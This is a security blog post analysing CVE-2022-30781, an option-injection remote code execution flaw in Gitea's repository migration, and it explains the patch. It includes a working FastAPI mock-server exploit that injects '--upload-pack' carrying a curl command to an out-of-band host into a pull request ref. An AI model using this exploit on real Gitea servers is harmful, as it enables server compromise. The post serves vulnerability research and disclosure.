<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Hi, I&#39;m Khaled, a cybersecurity engineer passionate about offensive security, software development, and DevSecOps. I specialize in penetration testing, bug bounty hunting, vulnerability research, and security automation. Through my blog, I share practical security knowledge, CTF writeups, tool development insights, and challenge walkthroughs to help the cybersecurity community learn and grow. When I&#39;m not breaking things, I&#39;m building security tools in Rust and Python, contributing to open source projects, and mentoring aspiring security professionals.">
    <meta name="keywords" content="cybersecurity, penetration testing, bug bounty, security research, vulnerability assessment, ethical hacking, security automation, CTF competitions, offensive security, mindpatch">
    <meta name="author" content="Khaled Nassar">

    <title>Analysis of CVE-2022‚Äì30781 - @MindPatch</title>

    <link rel="stylesheet" href="/css/style.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.css">

    

    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">

    
    <script type="module">
        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';

        mermaid.initialize({
            startOnLoad: false,
            theme: 'dark',
            themeVariables: {
                darkMode: true,
                background: '#1a1a1a',
                primaryColor: '#3a3a3a',
                primaryTextColor: '#e0e0e0',
                primaryBorderColor: '#666',
                lineColor: '#999',
                secondaryColor: '#4a4a4a',
                tertiaryColor: '#2a2a2a',
                fontSize: '16px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
                nodeBorder: '#666',
                clusterBkg: '#2a2a2a',
                clusterBorder: '#555',
                edgeLabelBackground: 'rgba(0, 0, 0, 0.8)',
                textColor: '#e0e0e0'
            },
            flowchart: {
                nodeSpacing: 100,
                rankSpacing: 100,
                padding: 20,
                useMaxWidth: true
            }
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            
            document.querySelectorAll('pre code, pre.mermaid').forEach((element) => {
                const code = element.textContent.trim();

                
                const isMermaid = code.match(/^(graph|flowchart|sequenceDiagram|classDiagram|stateDiagram|erDiagram|journey|gantt|pie|gitGraph|mindmap|timeline|quadrantChart|requirementDiagram|C4Context)/);

                if (isMermaid || element.classList.contains('language-mermaid') || element.getAttribute('data-lang') === 'mermaid') {
                    const pre = element.tagName === 'PRE' ? element : element.parentElement;

                    
                    const div = document.createElement('div');
                    div.className = 'mermaid';
                    div.textContent = code;

                    
                    if (pre.parentElement) {
                        pre.parentElement.replaceChild(div, pre);
                    }
                }
            });

            
            mermaid.run();
        });
    </script>
</head>
<body>
    <header>
    <a href="/" class="site-logo">‚ñ≤</a>
    <nav>
        
        <a href="/about">about</a>
        
        <a href="/posts">blog</a>
        
        <a href="/projects/">projects</a>
        
        <a href="/index.xml">rss</a>
    </nav>
</header>


    <main>
        
<div class="post-layout">
    <article class="post-article">
        <div class="post-header">
            <h1>Analysis of CVE-2022‚Äì30781</h1>
            <div class="post-meta">
                <span class="post-date">2025-04-10</span>
                
                <span class="post-tags">
                    
                    <a href="/tags/gitea" data-tippy-content="View all posts tagged with Gitea">#Gitea</a>
                    
                    <a href="/tags/rce" data-tippy-content="View all posts tagged with RCE">#RCE</a>
                    
                    <a href="/tags/git" data-tippy-content="View all posts tagged with git">#git</a>
                    
                    <a href="/tags/research" data-tippy-content="View all posts tagged with research">#research</a>
                    
                    <a href="/tags/cve" data-tippy-content="View all posts tagged with cve">#cve</a>
                    
                </span>
                
            </div>
        </div>

        <div class="post-content">
            <hr>
<p>How Git Fetch Resulted in Critical Remote Code Execution in Gitea</p>
<p><img src="https://miro.medium.com/v2/resize:fit:477/0*7XgQCsp0nd9dRoQo.png" alt=""></p>
<p><strong>Good Morning, Everyone!</strong></p>
<p>In today‚Äôs post, I‚Äôll dive into an analysis of  <strong>CVE-2022‚Äì30781</strong>, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.</p>
<p>Here‚Äôs what we‚Äôll cover:</p>
<ol>
<li><strong>Understanding How the CVE Works</strong></li>
<li><strong>Writing Our Own Exploit</strong></li>
<li><strong>How the Gitea Team Fixed It</strong></li>
</ol>
<p>Let‚Äôs jump in and enjoy</p>
<h2 id="import-your-git-repo-here">Import your Git repo here</h2>
<p>in every git platform like gitea, it has a feature that allows you to import all your repo from another platform or different git server into your platform in single click which called  <strong>Migration</strong></p>
<p>but beside .git repo it&rsquo;s also provides some other options to</p>
<ul>
<li>pull requests</li>
<li>Wiki page</li>
<li>issues</li>
</ul>
<p><img src="https://miro.medium.com/v2/resize:fit:610/1*WbwcS7_bkRCKzFRpqfbAGQ.png" alt=""></p>
<p>and in order to extract these data gitea communicate with the chosen platform API in order to import this data</p>
<p>and in one of these options is migrate a repo from another gitea server, and by choosing this option you can notice in logs a few requests from gitea for these endpoints</p>
<p><img src="https://miro.medium.com/v2/resize:fit:1000/1*L1GbLaJQJ5ci-rF6n69WCg.png" alt=""></p>
<p>and one of these endpoints returns the repo pull requests information including the pull request branch, and then gitea will fetch this branch using  <code>$ git fetch &lt;remote&gt; &lt;branch&gt;</code></p>
<p><img src="https://miro.medium.com/v2/resize:fit:1000/1*_NpVmALCvNOrfyiALbmzUA.png" alt=""></p>
<p>and as you can see, we cannot Espace using whitespace here in order to get that RCE</p>
<h2 id="fetch-options">Fetch options</h2>
<p>The Fetch git subcommand has a few different options you can find here (<a href="https://git-scm.com/docs/git-fetch">Git ‚Äî git-fetch Documentation</a>)</p>
<p>and the interesting one here is  <strong>‚Äî upload-pack</strong> option</p>
<blockquote>
<p>‚Äî upload-pack <upload-pack></p>
<p>When given, and the repository to fetch from is handled by  <strong>git fetch-pack</strong>,  <code>--exec=&lt;upload-pack&gt;</code>  is passed to the command to specify non-default path for the command run on the other end.</p>
</blockquote>
<p>So, Using this option lets us change the default path of the  <code>git-upload-pack</code>  tool. This can potentially lead to Remote Code Execution (RCE).</p>
<p>To exploit this, we could inject  <code>--upload-pack='CMD'</code>  into a branch name or a remote repository. However, Git itself doesn‚Äôt allow this directly. üòû</p>
<p>But as mentioned earlier, Gitea servers use APIs to fetch repository information. So, we can set up a mock server to return fake data. When the server asks for the pull request branch, we can include the  <code>--upload-pack</code>  option in the response and check if it gets executed</p>
<h2 id="writing-the-exploit">Writing The Exploit</h2>
<p>In writing the exploit process I always chose python as its the fastest and painless option for me, but you can pick what you like</p>
<p>lets go write our exploit, and this one requires us first to see what gitea api client expect the response so we make sure it gets parsed right</p>
<p>and this step can be done easily after analysing the gitea Swagger file, and after review it I came up with this simple API written in FastAPI</p>
<pre><code class="language-python">from fastapi import APIRouter  
  
router = APIRouter(prefix=&quot;/api/v1&quot;)  
RCE_PAYLOAD = &quot;curl ID.oast.fun&quot;  
  
  
# Mock data for some endpoints  
MAX_RESPONSE_ITEMS = 50  
DEFAULT_PAGING_NUM = 30  
DEFAULT_GIT_TREES_PER_PAGE = 1000  
DEFAULT_MAX_BLOB_SIZE = 10485760  
full_uri = &quot;http://localhost:3000/&quot;  
  
@router.get(&quot;/version&quot;)  
async def get_version():  
    return {&quot;version&quot;: &quot;1.16.6&quot;}  
  
@router.get(&quot;/settings/api&quot;)  
async def get_settings():  
    return {  
        &quot;max_response_items&quot;: MAX_RESPONSE_ITEMS,  
        &quot;default_paging_num&quot;: DEFAULT_PAGING_NUM,  
        &quot;default_git_trees_per_page&quot;: DEFAULT_GIT_TREES_PER_PAGE,  
        &quot;default_max_blob_size&quot;: DEFAULT_MAX_BLOB_SIZE,  
    }  
  
@router.get(&quot;/repos/{owner}/{repo}&quot;)  
async def get_repo_info(owner: str, repo: str):  
    &quot;&quot;&quot;  
    Returns repository information for a given owner and repo.  
    &quot;&quot;&quot;  
    return {  
        &quot;clone_url&quot;: f&quot;{full_uri}{owner}/{repo}&quot;,  
        &quot;owner&quot;: {&quot;login&quot;: owner},  
    }  
  
@router.get(&quot;/repos/{owner}/{repo}/topics&quot;)  
async def get_repo_topics(owner: str, repo: str):  
    return {&quot;topics&quot;: []}  
  
@router.get(&quot;/repos/{owner}/{repo}/pulls&quot;)  
async def get_repo_pulls(owner: str, repo: str):  
    &quot;&quot;&quot;  
    Returns pull requests for a given repository.  
    &quot;&quot;&quot;  
    return [  
        {  
            &quot;base&quot;: {&quot;ref&quot;: &quot;master&quot;},  
            &quot;head&quot;: {  
                &quot;ref&quot;: f&quot;--upload-pack={RCE_PAYLOAD}&quot;,  
                &quot;repo&quot;: {  
                    &quot;clone_url&quot;: &quot;./&quot;,  
                    &quot;owner&quot;: {&quot;login&quot;: &quot;master&quot;},  
                },  
            },  
            &quot;updated_at&quot;: &quot;2001-01-01T05:00:00+01:00&quot;,  
            &quot;user&quot;: {},  
        }  
    ]
</code></pre>
<p>As you can see in the pulls endpoint, I was able to inject the  <code>--upload-pack</code>  option into the  <code>ref</code>, which corresponds to the pull request&rsquo;s base branch.</p>
<p>Now, let‚Äôs test it. I ran the API, created a new migration in Gitea, and set the repository URL to  <code>myapi/test/test</code>. Additionally, I enabled the option to fetch pull requests, ensuring that it pulls the repository&rsquo;s pull requests during the migration process</p>
<p>And as you can See :)</p>
<p><a href="https://www.youtube.com/watch?v=9KOjRB9IKSo"><img src="https://img.youtube.com/vi/9KOjRB9IKSo/0.jpg" alt="VIDEO POC"></a></p>
<p>In the background, the following command was executed:<br>
<code>$ git fetch origin --upload-pack='curl &lt;host&gt;'</code></p>
<p>This caused Gitea to make the specified  <code>curl</code>  request, demonstrating that the RCE was successfully exploited as a proof of concept (PoC)</p>
<h2 id="patching-the-bug">Patching the bug</h2>
<p>Gitea team fixed this bug by using  <code>--</code>, which forces Git to treat everything following it as a plain string rather than a parsable option, This effectively resolves the issue.</p>
<p><img src="https://miro.medium.com/v2/resize:fit:1000/1*lreFlMwsoRz_970hBC3siA.png" alt=""></p>
<p>And that‚Äôs it! I hope you found this helpful.</p>
<p>You can access the testing lab and the exploit at:<br>
<a href="https://github.com/MindPatch/latestpocs">latestpocs/CVE-2022‚Äì30781/gitea_poc at master ¬∑ MindPatch/latestpocs</a></p>
<p>Take care, and see you next time! üôÇ</p>

        </div>
    </article>

    
    
    <aside class="toc-sidebar">
        <div class="toc">
            <div class="toc-title">Table of Contents</div>
        </div>
    </aside>
    
</div>

<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;">
    <a href="/posts">‚Üê Back to posts</a>
</div>

    </main>

    <footer>
    <p>&copy; 2025 Khaled Nassar</p>
</footer>


    
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.js"></script>

    
    <script src="https://unpkg.com/@popperjs/core@2"></script>
    <script src="https://unpkg.com/tippy.js@6"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.js"></script>

    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            Prism.highlightAll();

            
            mediumZoom('article img, .post-content img', {
                margin: 24,
                background: 'rgba(0, 0, 0, 0.9)',
                scrollOffset: 0
            });

            
            renderMathInElement(document.body, {
                delimiters: [
                    {left: '$$', right: '$$', display: true},
                    {left: '$', right: '$', display: false},
                    {left: '\\(', right: '\\)', display: false},
                    {left: '\\[', right: '\\]', display: true}
                ],
                throwOnError: false
            });

            
            if (document.querySelector('.toc')) {
                tocbot.init({
                    tocSelector: '.toc',
                    contentSelector: '.post-content',
                    headingSelector: 'h2, h3, h4',
                    hasInnerContainers: true,
                    collapseDepth: 6,
                    scrollSmooth: true,
                    scrollSmoothDuration: 420,
                    headingsOffset: 40,
                    scrollSmoothOffset: -40,
                    positionFixedSelector: '.toc',
                    fixedSidebarOffset: 'auto',
                    throttleTimeout: 50,
                    includeHtml: false,
                    onClick: function(e) {
                        e.preventDefault();
                        const targetId = e.target.getAttribute('href');
                        const targetElement = document.querySelector(targetId);
                        if (targetElement) {
                            targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }
                });
            }

            
            tippy('[data-tippy-content]', {
                theme: 'custom',
                placement: 'top',
                arrow: true,
                animation: 'scale'
            });

            
            document.querySelectorAll('pre[class*="language-"]').forEach(function(pre) {
                pre.classList.add('line-numbers');
            });
        });
    </script>
</body>
</html>
